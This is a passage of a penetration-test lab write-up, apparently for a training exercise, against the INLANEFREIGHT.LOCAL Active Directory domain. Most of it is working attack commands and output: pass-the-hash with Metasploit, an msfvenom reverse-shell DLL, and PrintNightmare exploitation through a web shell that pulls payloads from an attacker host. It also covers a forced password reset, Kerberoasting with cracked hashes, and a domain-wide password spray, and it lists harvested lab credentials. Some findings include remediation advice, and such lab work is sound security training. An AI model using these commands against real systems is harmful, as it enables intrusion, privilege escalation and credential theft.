NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

We were able to confirm authentication via Pass-the-hash (PtH)
To do this we used msfconsole

```
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> setg Proxies SOCKS5:127.0.0.1:8081
Proxies => SOCKS5:127.0.0.1:8081
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set RHOSTS 172.16.8.20
RHOSTS => 172.16.8.20
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set SMBUser administrator
SMBUser => administrator
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set SMBPass 00000000000000000000000000000000:0e20798f695ab0d04bc138b22344cea8
SMBPass => 00000000000000000000000000000000:0e20798f695ab0d04bc138b22344cea8
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set THREADS 1
THREADS => 1
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> run
[*] 172.16.8.20:445       - 172.16.8.20:445 - Starting SMB login bruteforce
[+] 172.16.8.20:445       - 172.16.8.20:445 - Success: '.\administrator:00000000000000000000000000000000:0e20798f695ab0d04bc138b22344cea8' Administrator
[!] 172.16.8.20:445       - No active DB -- Credential data will not be saved!
[*] 172.16.8.20:445       - Scanned 1 of 1 hosts (100% complete)
[*] 172.16.8.20:445       - Bruteforce completed, 1 credential was successful.
[*] 172.16.8.20:445       - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

![[Pasted image 20260217144804.png]]

We now have our first set of domain credentials for the INLANEFREIGHT.LOCAL domain, `hporter:Gr8hambino!`. We confirmed this from our reverse shell on `dmz01`.

C:\Windows\system32>net user hporter /dom
```
net user hporter /dom
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 10:32:05 AM
Password expires             Never
Password changeable          6/1/2022 10:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/22/2022 8:59:46 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

Alternatively, we tested and were able to escalate privileges on DEV01 using PrintNightmare

$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.8.120 LPORT=9001 -f dll -o nightmare.dll
$ scp -i dmz01_key nightmare.dll root@10.129.11.15:/tmp/

On the web shell 
``` webshell
powershell -c "Invoke-WebRequest -Uri http://172.16.8.120:9999/nightmare.dll -OutFile C:\Windows\Temp\nightmare.dll"
```

$ git clone https://github.com/calebstewart/CVE-2021-1675
$ mv CVE-2021-1675/CVE-2021-1675.ps1 ~
$ scp -i dmz01_key CVE-2021-1675.ps1 root@10.129.11.15:/tmp/

On the web shell:
```webshell
powershell -c "Invoke-WebRequest -Uri http://172.16.8.120:9999/CVE-2021-1675.ps1 -OutFile C:\Windows\Temp\CVE-2021-1675.ps1"

powershell -ep bypass -c "Import-Module C:\Windows\Temp\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Password123!'"
```

![[Pasted image 20260217150337.png]]

From our attack box we were able to rdp over proxychains to our local 
$ proxychains xfreerdp /v:172.16.8.20 /u:hacker /p:'Password123!' /size:1200x900 +clipboard

![[Pasted image 20260217151242.png]]

Finding: Privilege Escalation via PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
Risk Rating: **High**

**Description**
The host ACADEMY-AEN-DEV (172.16.8.20) was found to be vulnerable to PrintNightmare, a critical flaw in the Windows Print Spooler service. This vulnerability allows a low-privileged user to inject a malicious driver or bypass authentication to gain full administrative control of the system.

**Impact**
An attacker with limited web server access) can elevate their privileges to NT AUTHORITY\SYSTEM. During this assessment, the flaw was used to:
1. Bypass local security controls.
2. Create a new administrative user account (hacker).
3. Establish a persistent Remote Desktop (RDP) session, allowing for full administrative access to the development environment.
4. Potentially harvest cached domain credentials for lateral movement to the Domain Controller.

The Print Spooler service was confirmed to be running and improperly configured to allow the loading of remote/local drivers without administrative authorization.

**Remediation Recommendations**
- Immediate Action: Disable the Print Spooler service on all servers where printing is not strictly required, especially those exposed to the internet or web traffic.
	- Command: *Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled*

- Patching: Apply the latest cumulative Windows security updates to address CVE-2021-1675 and CVE-2021-34527.
- Policy Enforcement: Configure the "Restrict Driver Installation to Administrators" Group Policy setting to prevent non-privileged users from installing print drivers.

Since we've got our hooks deep into DEV01, we used it as our staging area for launching further attacks. We used the SharpHound collector to enumerate all possible AD objects and then ingest the data into the BloodHound GUI.

$ wget https://github.com/SpecterOps/SharpHound/releases/download/v2.9.0/SharpHound_v2.9.0_windows_x86.zip
$ unzip SharpHound_v2.9.0_windows_x86.zip

We then used the handy dandy DNN file manager to upload it to the target ![[Pasted image 20260217153307.png]]


```
C:\DotNetNuke\Portals\0>SharpHound.exe -c All
2026-02-17T13:52:15.3082409-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-02-17T13:52:15.3238658-08:00|INFORMATION|SharpHound Version: 2.9.0.0
2026-02-17T13:52:15.3238658-08:00|INFORMATION|SharpHound Common Version: 4.5.2.0
2026-02-17T13:52:15.4332407-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-02-17T13:52:15.4488697-08:00|INFORMATION|Initializing SharpHound at 1:52 PM on 2/17/2026
2026-02-17T13:52:15.7301311-08:00|INFORMATION|Resolved current domain to INLANEFREIGHT.LOCAL
2026-02-17T13:52:15.9176924-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-02-17T13:52:15.9958427-08:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2026-02-17T13:52:15.9958427-08:00|INFORMATION|Collecting AdminSDHolder data for INLANEFREIGHT.LOCAL
2026-02-17T13:52:16.0426224-08:00|INFORMATION|AdminSDHolder ACL hash 505308D7380049A298C46932667BF2BE5A48C06F calculated for INLANEFREIGHT.LOCAL.
<SNIP>
</SNIP>
2026-02-17T13:52:20.3551309-08:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL Configuration NC
2026-02-17T13:52:20.4332531-08:00|INFORMATION|Producer has finished, closing LDAP channel
2026-02-17T13:52:20.4332531-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-02-17T13:52:20.4488722-08:00|INFORMATION|[CommonLib LdapQuery]Execution time Average: 0.86622ms, StdDiv: 0.365385074955177ms
2026-02-17T13:52:20.5895040-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-02-17T13:52:20.6051310-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-02-17T13:52:20.9020050-08:00|INFORMATION|Status: 3843 objects finished (+3843 960.75)/s -- Using 73 MB RAM
2026-02-17T13:52:20.9020050-08:00|INFORMATION|Enumeration finished in 00:00:04.9222348
2026-02-17T13:52:21.1207773-08:00|INFORMATION|Saving cache with stats: 20 ID to type mappings.
 2 name to SID mappings.
 3 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2026-02-17T13:52:21.1520068-08:00|INFORMATION|SharpHound Enumeration Completed at 1:52 PM on 2/17/2026! Happy Graphing!
```

This generated a handy zip file that we downloaded via the DNN file management tool again (so convenient!). Next we started the neo4j service, typed bloodhound and opened the GUI tool to ingest the data.

![[Pasted image 20260217155552.png]]

$ sudo neo4j start

![[Pasted image 20260217155636.png]]

Logged in using default creds neo4j:neo4j

![[Pasted image 20260217155739.png]]

Searching for our user `hporter` and selecting `First Degree Object Control`, we can see that the user has `ForceChangePassword` rights over the `ssmalls` user.

![[Pasted image 20260218101719.png]]

Aside from that, we see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RD{ in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth nothing as a **Medium-Risk** finding for **Excessive Active Directory Group Privileges.**

Ensured that port 3389 (RDP) was open

```nmap
$ proxychains nmap -sT -Pn -p 3389 172.16.8.20
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-18 09:52 CST
Nmap scan report for 172.16.8.20
Host is up.

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```

We utilized another SSH port forwarding technique, this type is **Local Port Fowarding.** The command allows us to pass all RDP traffic to DEV01 through the dmz01 host via local port 13389.

```
$ ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.1.110
```


Once this port forward is set up, we used xfreerdp to connect to the host using drive redirection to transfer files back and forth easily.

```
$ xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,/home/htb-ac-1631704
```

![[Pasted image 20260218105736.png]]

Transferred PowerView.ps1 to **hporter**, we can use this to change **ssmalls** user's password.

$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 

```cmd
C:\Users\hporter>net use
New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


C:\Users\hporter>copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

![[Pasted image 20260218110100.png]]

```powershell
C:\Users\hporter>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\hporter> Import-Module .\PowerView.ps1
PS C:\Users\hporter> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

![[Pasted image 20260218110507.png]]

Confirming we can SMB into ssmalls
$ sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

![[Pasted image 20260218133223.png]]
## Share Hunting

Digging around the host and AD some more, we don't see much of anything useful. BloodHound does not show anything interesting for the `ssmalls` user. At this point we decided to dig into file shares.

First, we ran Snaffler from our RDP sessions as the hporter user.

$ wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.234/Snaffler.exe

```powershell
C:\Users\hporter>copy \\TSCLIENT\home\Snaffler.exe
C:\Users\hporter>.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

This doesn't turn up anything interesting, so we re-run our share enumeration as the `ssmalls` user. We used the CrackMapExec spider_plus module to dig around. 


``` spider_plus
$ sudo proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:135  ...  OK
SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
SPIDER_PLUS 172.16.8.3      445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 172.16.8.3      445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 172.16.8.3      445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 172.16.8.3      445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 172.16.8.3      445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 172.16.8.3      445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 172.16.8.3      445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         172.16.8.3      445    DC01             [*] Enumerated shares
SMB         172.16.8.3      445    DC01             Share           Permissions     Remark
SMB         172.16.8.3      445    DC01             -----           -----------     ------
SMB         172.16.8.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.8.3      445    DC01             C$                              Default share
SMB         172.16.8.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.8.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.8.3      445    DC01             NETLOGON        READ            Logon server share
SMB         172.16.8.3      445    DC01             SYSVOL          READ            Logon server share
<SNIP>
</SNIP>
SPIDER_PLUS 172.16.8.3      445    DC01             [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
SPIDER_PLUS 172.16.8.3      445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/172.16.8.3.json".
SPIDER_PLUS 172.16.8.3      445    DC01             [*] SMB Shares:           3 (ADMIN$, C$, Department Shares)
SPIDER_PLUS 172.16.8.3      445    DC01             [*] SMB Readable Shares:  1 (Department Shares)
SPIDER_PLUS 172.16.8.3      445    DC01             [*] Total folders found:  2
SPIDER_PLUS 172.16.8.3      445    DC01             [*] Total files found:    0
```

Since we now know "Department Shares" is the target we delved deeper into it using smbclient.py

$ sudo proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py INLANEFREIGHT/ssmalls:'Str0ngpass86!'@172.16.8.3

```
$ sudo proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py INLANEFREIGHT/ssmalls:'Str0ngpass86!'@172.16.8.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
Type help for list of commands
# use Department Shares
# ls
drw-rw-rw-          0  Wed Jun  1 13:34:56 2022 .
drw-rw-rw-          0  Wed Jun  1 13:34:56 2022 ..
drw-rw-rw-          0  Wed Jun  1 13:36:07 2022 Accounting
drw-rw-rw-          0  Wed Jun  1 13:36:00 2022 Executives
drw-rw-rw-          0  Wed Jun  1 13:35:53 2022 Finance
drw-rw-rw-          0  Wed Jun  1 13:35:29 2022 HR
drw-rw-rw-          0  Wed Jun  1 13:35:14 2022 IT
drw-rw-rw-          0  Wed Jun  1 13:35:45 2022 Marketing
drw-rw-rw-          0  Wed Jun  1 13:35:37 2022 R&D
```

We dug deeper into the IT share and found a jackpot *SQL Express Backup.ps1*, new creds, a classic keyboard walk password.
- backupadm:!qazXSW@

```
# cd IT
# ls
drw-rw-rw-          0  Wed Jun  1 13:35:14 2022 .
drw-rw-rw-          0  Wed Jun  1 13:35:14 2022 ..
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 Private
drw-rw-rw-          0  Wed Jun  1 13:35:14 2022 Public
# cd Private
# ls
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 .
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 ..
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 Development
# cd Development
# ls
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 .
drw-rw-rw-          0  Wed Jun  1 13:35:16 2022 ..
-rw-rw-rw-       4001  Wed Jun  1 13:35:16 2022 SQL Express Backup.ps1
```

```SQL Express Backup.ps1
# cat SQL Express Backup.ps1
$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"

$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)

$dbs = $server.Databases
$startDate = (Get-Date)
"$startDate"

Get-ChildItem "$backupDirectory\*_daily.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreDailyBackups)} |% {Remove-Item $_ -force }
"removed all previous daily backups older than $daysToStoreDailyBackups days"

foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
{
    $dbName = $database.Name      

    $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
    $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_daily.bak"

    $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
    $smoBackup.Action = "Database"
    $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
    $smoBackup.BackupSetName = $dbName + " Backup"
    $smoBackup.Database = $dbName
    $smoBackup.MediaDescription = "Disk"
    $smoBackup.Devices.AddDevice($targetPath, "File")
    $smoBackup.SqlBackup($server) 
    "backed up $dbName ($serverName) to $targetPath"               
}

if([Int] (Get-Date).DayOfWeek -eq 0)
{
    Get-ChildItem "$backupDirectory\*_weekly.bak" |? { $_.lastwritetime -le (Get-Date).AddDays(-$daysToStoreWeeklyBackups)} |% {Remove-Item $_ -force }
    "removed all previous daily backups older than $daysToStoreWeeklyBackups days"

    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
    {
        $dbName = $database.Name      

        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_weekly.bak"

        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
        $smoBackup.Action = "Database"
        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
        $smoBackup.BackupSetName = $dbName + " Backup"
        $smoBackup.Database = $dbName
        $smoBackup.MediaDescription = "Disk"
        $smoBackup.Devices.AddDevice($targetPath, "File")
        $smoBackup.SqlBackup($server) 
        "backed up $dbName ($serverName) to $targetPath"                 
    }
}

if([Int] (Get-Date).Day -eq 1)
{
    Get-ChildItem "$backupDirectory\*_monthly.bak" |? { $_.lastwritetime -le (Get-Date).AddMonths(-$monthsToStoreMonthlyBackups)} |% {Remove-Item $_ -force }
    "removed all previous monthly backups older than $monthsToStoreMonthlyBackups days"

    foreach ($database in $dbs | where { $_.IsSystemObject -eq $False})
    {
        $dbName = $database.Name      

        $timestamp = Get-Date -format yyyy-MM-dd-HHmmss
        $targetPath = $backupDirectory + "\" + $dbName + "_" + $timestamp + "_monthly.bak"

        $smoBackup = New-Object ("Microsoft.SqlServer.Management.Smo.Backup")
        $smoBackup.Action = "Database"
        $smoBackup.BackupSetDescription = "Full Backup of " + $dbName
        $smoBackup.BackupSetName = $dbName + " Backup"
        $smoBackup.Database = $dbName
        $smoBackup.MediaDescription = "Disk"
        $smoBackup.Devices.AddDevice($targetPath, "File")
        $smoBackup.SqlBackup($server) 
        "backed up $dbName ($serverName) to $targetPath"                 
    }
}
```

Before tried to use this account somewhere, we dug around a bit more. There is an interesting .vbs file on the SYSVOL share, which is accessible to all Domain Users.

```shell
$ sudo proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Password for [WORKGROUP\ssmalls]:
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 13:10:57 2022
  ..                                  D        0  Wed Jun  1 13:10:57 2022
  INLANEFREIGHT.LOCAL                Dr        0  Wed Jun  1 13:10:57 2022

		10328063 blocks of size 4096. 8198849 blocks available
smb: \> cd INLANEFREIGHT.LOCAL\
smb: \INLANEFREIGHT.LOCAL\> ls
  .                                   D        0  Wed Jun  1 13:17:38 2022
  ..                                  D        0  Wed Jun  1 13:17:38 2022
  DfsrPrivate                      DHSr        0  Wed Jun  1 13:17:38 2022
  Policies                            D        0  Wed Jun  1 13:11:09 2022
  scripts                             D        0  Wed Jun  1 13:34:41 2022

		10328063 blocks of size 4096. 8198849 blocks available
smb: \INLANEFREIGHT.LOCAL\> cd scripts\
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Wed Jun  1 13:34:41 2022
  ..                                  D        0  Wed Jun  1 13:34:41 2022
  adum.vbs                            A    32921  Wed Jun  1 13:34:39 2022

		10328063 blocks of size 4096. 8198849 blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (92.9 KiloBytes/sec) (average 92.9 KiloBytes/sec)
```

```shell
$ cat adum.vbs 
Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21
'' Author: Todd Fencl [tfencl@innotrac.com]
'' Mod Author: Todd Fencl
''
<SNIP>
</SNIP>
''### VARIABLES THAT MIGHT NEED TWEAKED ###
''Needed for sending email, To, CC, mail server
'Const cTo = ""
Const cTo = "tss@inlanefreight.local; ITunixsystems@inlanefreight.local, it_noc@inlanefreight.local"	'WHO ARE WE SENDING EMAIL TO
Const cCC = "tfencl@radial.com"				'WHO TO CC IF ANY
Const cSMTPServer = "mailhost.inlanefreight.local"	'EMAIL - EXCHANGE SERVER
Const cFrom = "helpdesk@inlanefreight.local"		'EMAIL - WHO FROM
Const cSubject = "Active Directory User Management report"	'EMAIL - SUBJECT LINE

''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"			'EMAIL - PASSWORD - IF AUTHENTICATION REQUIRED

<SNIP>
</SNIP>
```

We popped another pair of creds here ``account:L337^p@$$w0rD``

We checked in BloodHound, and we did not find an `account` user, so this may just be an old password. Based on the year in the script comments, it likely is. This is still a **high risk** finding of **leaking sensitive data**, as this could potential be a reused service account password.

Next we pivoted to using PowerView enumerate Service Principal Name (SPN) accounts.

```powershell
PS C:\Users\hporter> Get-DomainUser * -SPN |Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

There are quite a few hashes so we pulled them to a CSV file and copied to our attack box for offline processing.

```powershell
PS C:\Users\hporter> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
PS C:\Users\hporter> copy .\ilfreight_spns.csv \\Tsclient\Home
```

Trimmed this file down to just get the hashes

```shell
$ awk -F'"' '/\$krb5tgs\$/ {print $(NF-1)}' ilfreight_spns.csv > clean_hashes.txt
```

Next, we ran Hashcat on the hashes to crack them

```shell
hashcat -m 13100 clean_hashes.txt rockyou.txt --force
```

BAM! we got a hit more creds, backup:lucky7

```shell
$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$eee6dddce21834dfbb56a2fc28eaf573$9955156ec54a9c3d220906e1bb91f9201ff34d02e286fe10f0af8bca4bbf5163a15dee69b438bcd13aa3b0f0b404869ea330f48ad6e0b3bcc55e96ca03f7b31627fe745db38e983c209ad0972d8f9cb106b78de6d8dccb7ead1943a9daba4a24f5d2eded7c3b8b9c5ad57ec3eb92d6c78a0bdafaf3f635e10b809d1a3caa8505bee7caaca7bd49445c486f5aa02f73c0ecba6beb13a1b3c85f616331bece67dca15c8bbe631e282f7728f1c54f531a6e11ab83ee3e05fb1c60a12dc6ac20e3abe0bde87b2a8400545f29cb8c0baea10c342484ceb6944df9e80e452f29023420c11a99089bb5317564d3095c5597d20aead670250824d4a99e63ae67b64d08742beba34e80e1ec2cd56ac8924c544ca3abe2ca09ff419899fc5c60bdb0b0ea5c31c449d8ffb6d87d2b2fbe71b9fa55c7343d8b88b6c24fcfc48de5751a8a1b11b36b124edf6d1e33c2d590cb45b5960ee2683f7e28c4bd2b26c0459996081d29a4387531492c9ee079bb6356a246434eb74fe2fb96138f872cc278a252a680425611560d72d57ed183d213fae41cd73f2766b0c145569b279377b224a040bfb65f701901db3db25ebaafa43b2e8674cc58785ef2e0c8c47a58981d0c2cddeb9d5f2050032f817dd9259b44aa02218902c5279844687d55d2f0945d5586a6ba2507d1fc7ac6deda5e3bbb65b05ef0294c3a29c81c55c32773ae5b22cfa93a2a4c0f5fdfcef6fe1594509f053280e275249722b63e9b880512828dc382c637e593ca7c5fde7133054ce8546e17dfd9213c60442800b9a2229edc284a9aa1e389ce4edca4a016f1903e2c968b8db42d6f03d7625e6f939607074d7cdd2a7c3e86fd3fffa0706f94b8b92b6999949e9b60cd3ef454e730af407a6f2b2a17237391c3ea6a92ca87f07e0b39fb8935b80b7a3c43a8abaa1d833c5146457877e739487a744127d3f841c08a3c572cd93cb23e77e03a9cb2afc73c8deeaaf4469a5b01f0a0e6884efc1e80eb6fa306c7c11c71052cf2f193b14808ccdaec5c71f2c96e745db2c5f0d528f024dbc3d720d34e55092cce32d2a5c1a8000c5b2d80f6184c8356863a690ae539c2688b3ff33fcd6b404c5182e9d152c42e44f31799a8960feaa3dc22c3c470cd5bf73583634b5a4b587fa1a82a6ed70b576cd93d037de38969c9422c0b4e9f1b8a2f721e2e526900caf074650e31ed107e4b76ccbca519b0277436d610b1ef7adf229b094a01d68de6ee02173a3d59996d4276663c38be3b1029f13cbb06004277c7fb5f17e09987af6301c401d190d7d2d21cc80201f613a1fa15f059a9cfb43a84ef77623eeec1515944305cc0301152ff90384dfa4785782d26055aec32c3ff9d02e0dc5ecf5de52ab663223f75c3ab777b24bad21c0a277b270f49abe6d37903e0afd9e4a5595baea06938fbf3c01ad0a0d0e67865919a51bee63784aea861fa005fc56a6000dd8d9027132f81302f8feb74d5fbe73d23e6b9ee5a5f:lucky7
```

We attempted a Domain Password spray for a common password, "Welcome1" from our RDP hporter client

$ wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1

```powershell
PS C:\Users\hporter> copy \\TSCLIENT\home\DomainPasswordSpray.ps1 
PS C:\Users\hporter> Import-Module .\DomainPasswordSpray.ps1
PS C:\Users\hporter> Invoke-DomainPasswordSpray -Password Welcome1
[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] There appears to be no lockout policy.
[*] Removing disabled users from list.
[*] There are 2913 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2913 users gathered from the current user's domain
[*] The domain password policy observation window is set to 30 minutes.
[*] Setting a 30 minute wait in between sprays.
```

We **Pwn3d** two noobs
- kdenunez:Welcome1
- mmertle:Welcome1

```powershell
Confirm Password Spray
Are you sure you want to perform a password spray against 2913 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2913 users. Current time is 11:11 AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying is complete
```

After searching for passwords in the user Description fields in AD, we were able to pop another noob
- frontdesk:ILFreightLobby!

```powershell
PS C:\Users\hporter> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-in account for guest access to the computer/d...
krbtgt         Key Distribution Center Service Account
```

![[Pasted image 20260218141450.png]]

This is a **medium** risk finding for Passwords in AD User Description Field, because an attacker only needs one password to be successful in AD.

At this point we have dug into the domain pretty heavily and found several sets of creds, but hit a brick wall. 

Next, we attempted to attack 172.16.8.50 our only host we haven't touched.

We ran NMAP on the host and confirmed that WinRM is up.

```
$ sudo proxychains nmap -Pn -sT -p 5985 172.16.8.50
[proxychains] config file found: /etc/proxychains.conf
